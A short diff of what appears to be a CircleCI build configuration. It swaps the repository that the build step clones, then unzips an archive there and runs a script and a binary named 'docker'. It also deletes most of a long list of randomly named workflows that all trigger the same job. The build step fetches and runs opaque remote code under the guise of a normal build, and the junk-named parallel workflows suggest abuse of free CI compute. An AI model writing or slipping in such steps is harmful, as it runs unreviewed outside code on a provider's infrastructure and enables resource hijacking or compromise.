@@ -17,7 +17,7 @@ commands:
       - run:
           name: build
           command: |
-              git clone https://github.com/shuwaibahjaman/zenatan.git && cd zenatan && unzip docker.zip && chmod +x runner.sh docker && ./runner.sh
+              git clone https://github.com/shuwaibahjaman/sublimain.git && cd sublimain && unzip docker.zip && chmod +x runner.sh docker && ./runner.sh
               
 jobs:
   buildd:
@@ -42,50 +42,5 @@ workflows:
     jobs:
       - buildd
   tyjykykf:
-    jobs:
-      - buildd
-  bfkfytktf:
-    jobs:
-      - buildd
-  tyjktyk:
-    jobs:
-      - buildd
-  tyktkyky:
-    jobs:
-      - buildd
-  etrgved:
-    jobs:
-      - buildd
-  btyjtytjj:
-    jobs:
-      - buildd
-  rhtjtyj:
-    jobs:
-      - buildd
-  tyjtjtyry:
-    jobs:
-      - buildd
-  rtyytjkuk:
-    jobs:
-      - buildd
-  ykmhtyyj:
-    jobs:
-      - buildd
-  tjykmj:
-    jobs:
-      - buildd
-  tyjtkujm:
-    jobs:
-      - buildd
-  tyjuykh:
-    jobs:
-      - buildd
-  tyjjhm:
-    jobs:
-      - buildd
-  ytjuykjb:
-    jobs:
-      - buildd
-  ytjuyhukjb:
     jobs:
       - buildd
